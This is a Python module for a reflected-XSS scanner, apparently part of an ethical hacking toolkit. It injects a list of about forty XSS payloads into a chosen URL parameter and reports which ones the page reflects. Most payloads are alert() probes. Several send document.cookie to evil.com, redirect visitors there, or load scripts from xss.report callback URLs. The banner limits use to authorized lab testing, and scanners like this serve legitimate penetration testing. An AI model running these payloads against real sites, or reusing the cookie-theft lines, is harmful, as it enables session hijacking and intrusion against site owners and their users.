# modules/xss_scanner.py
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn

console = Console()

# Common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<img src=x onerror=alert('XSS')>",
    "<script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "'\"><img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "' autofocus onfocus=alert(1) //",
    "\" onmouseover=\"alert(1)",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=\"javascript:alert(1)\">",
    "<style>*{background:url('javascript:alert(1)');}</style>",
    "</script><script>alert(1)</script>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<a href=\"javascript:alert(1)\">Click me</a>",
    "<math><mi xlink:href=\"javascript:alert(1)\"></mi></math>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm(1)>",
    "<svg><script xlink:href=data:text/javascript,alert(1)></script></svg>",
    "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
    "<svg/onload=\"&#x61;lert(1)\">",
    "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
    "<svg/onload=this.onerror=alert;throw 1>",
    "<script src=https://xss.report/c/yourid></script>",
    "jaVasCript:/*-/*`/*\\\"/*'/* */prompt(1)/*\\n<link/rel=\\\"stylesheet\\\"/href=\\\"//xss.report/s/yourid\\\">/ <svg/onload=\\\"JSONP.set(\\\\\\\"//xss.report/s/yourid\\\\\\\")\\\">",
    "<img src=x onerror=this.src='http://evil.com/'+document.cookie>",
    "<svg onload=fetch('http://evil.com/'+document.cookie)>",
    "<details/open/ontoggle=alert(1)>",
    "<marquee/onstart=alert(1)>",
    "<body/onload=alert(1)>",
    "<isindex action=javascript:alert(1) type=image>",
    "<svg/onload=window.location='http://evil.com'>",
    "<input onfocus=alert(1) autofocus>",
    "javascript:alert(1)//",
    "'-alert(1)-'",
    "\";alert(1)//",
    "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>",
    "[Click Me](javascript:alert(1))",
    "![x](x)\" onerror=\"alert(1)",
]

def inject_payload(url, param, payload):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query, keep_blank_values=True)
    if param in query_params:
        query_params[param] = payload
        new_query = urlencode(query_params, doseq=True)
        new_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        return new_url
    else:
        return None

def scan_xss_get(url, param):
    """
    Run a reflected XSS GET scan against `url` testing parameter `param`.
    Returns a list of result dicts (same structure used by display_results).
    """
    console.rule("[bold cyan]Starting XSS GET Scan[/bold cyan]")
    results = []
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console,
        transient=True
    ) as progress:
        task = progress.add_task("[cyan]Testing XSS payloads...", total=len(xss_payloads))

        for payload in xss_payloads:
            console.print(f"[*] Trying payload: {payload}", style="cyan")
            injected_url = inject_payload(url, param, payload)
            if not injected_url:
                console.print(f"[red][!] Parameter '{param}' not found in URL.[/red]")
                return []

            try:
                response = requests.get(injected_url, timeout=5)
                if payload in response.text:
                    console.print("[green][+] XSS found! Payload reflected.[/green]")
                    results.append({
                        "Type": "XSS (Reflected)",
                        "Payload": payload,
                        "Status Code": str(response.status_code),
                        "Severity": "High",
                        "URL": injected_url
                    })
                else:
                    console.print("[red][✗] Payload not reflected.[/red]")
                    results.append({
                        "Type": "XSS (Not Reflected)",
                        "Payload": payload,
                        "Status Code": str(response.status_code),
                        "Severity": "Low",
                        "URL": injected_url
                    })
            except requests.exceptions.RequestException as e:
                console.print(f"[red][!] Request error: {e}[/red]")

            progress.update(task, advance=1)

    return results

def display_results(results, method):
    console.rule(f"[bold magenta]XSS Vulnerability Results ({method})[/bold magenta]")
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Type", style="cyan", justify="center")
    table.add_column("Payload", style="yellow", overflow="fold")
    table.add_column("Status Code", style="green", justify="center")
    table.add_column("Severity", style="red", justify="center")
    table.add_column("URL / Request", style="blue", overflow="fold")

    for result in results:
        table.add_row(
            result["Type"],
            result["Payload"],
            result["Status Code"],
            result["Severity"],
            result["URL"]
        )

    console.print(table)

def run_xss_scanner(interactive: bool = True, target_url: str | None = None, param_to_test: str | None = None):
    """
    Entry point for module usage.

    If interactive is True (default) the function will prompt for target URL and parameter.
    Otherwise, provide target_url and param_to_test to run headless and receive results list.
    """
    # Interactive prompt flow (same as original behavior)
    if interactive:

        welcome_text = r"""
[bold bright_cyan]

##     ##  ######   ######                                      
 ##   ##  ##    ## ##    ##                                     
  ## ##   ##       ##                                           
   ###     ######   ######                                      
  ## ##         ##       ##                                     
 ##   ##  ##    ## ##    ##                                     
##     ##  ######   ######                                      
 ######   ######     ###    ##    ## ##    ## ######## ######## 
##    ## ##    ##   ## ##   ###   ## ###   ## ##       ##     ##
##       ##        ##   ##  ####  ## ####  ## ##       ##     ##
 ######  ##       ##     ## ## ## ## ## ## ## ######   ######## 
      ## ##       ######### ##  #### ##  #### ##       ##   ##  
##    ## ##    ## ##     ## ##   ### ##   ### ##       ##    ## 
 ######   ######  ##     ## ##    ## ##    ## ######## ##     ##

[/bold bright_cyan]
[bold bright_green]Welcome to XSS Vulnerability Scanner[/bold bright_green]

[bright_yellow]This tool is intended for educational and authorized security testing only.[/bright_yellow]
[bright_red]⚠️  Do NOT use this tool against live or unauthorized websites.[/bright_red]
[bright_blue]✔ Always test in legal, controlled environments (e.g., DVWA, Juice Shop, TestFire).[/bright_blue]
"""

        console.print(
            Panel.fit(
                welcome_text,  # Use the raw string as the first positional argument
                title="[bold bright_magenta]🛡 XSS Vulnerability Scanner - Ethical Hacking Toolkit 🛡[/bold bright_magenta]",
                border_style="bright_cyan",
            )
        ) 
        target_url = Prompt.ask("[bold green]Enter target URL (e.g. http://test.com/search?q=test)[/bold green]").strip()
        param_to_test = Prompt.ask("[bold green]Enter parameter to test for XSS (e.g. q)[/bold green]").strip()
    else:
        if not target_url or not param_to_test:
            raise ValueError("When interactive=False, both target_url and param_to_test must be provided.")
        # use provided values
        target_url = target_url.strip()
        param_to_test = param_to_test.strip()

    # Always use GET as default
    results = scan_xss_get(target_url, param_to_test)
    display_results(results, "GET")
    return results


# Keep module runnable stand-alone
if __name__ == "__main__":
    run_xss_scanner()
